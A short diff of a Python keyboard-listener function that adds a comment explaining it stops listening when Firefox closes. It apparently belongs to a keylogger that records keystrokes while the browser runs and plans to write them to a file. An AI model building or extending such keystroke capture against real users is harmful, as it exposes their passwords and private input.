@@ -12,6 +12,7 @@ def checkStatus():
 
 def on_key_press(key):
     """ print(f'{key} is pressed') """
+    #reason that there is a check here, is to quit from the listener when firefox closes. 
     if(checkStatus()):
         #write keys to file from here
         print(f'{key} is pressed')
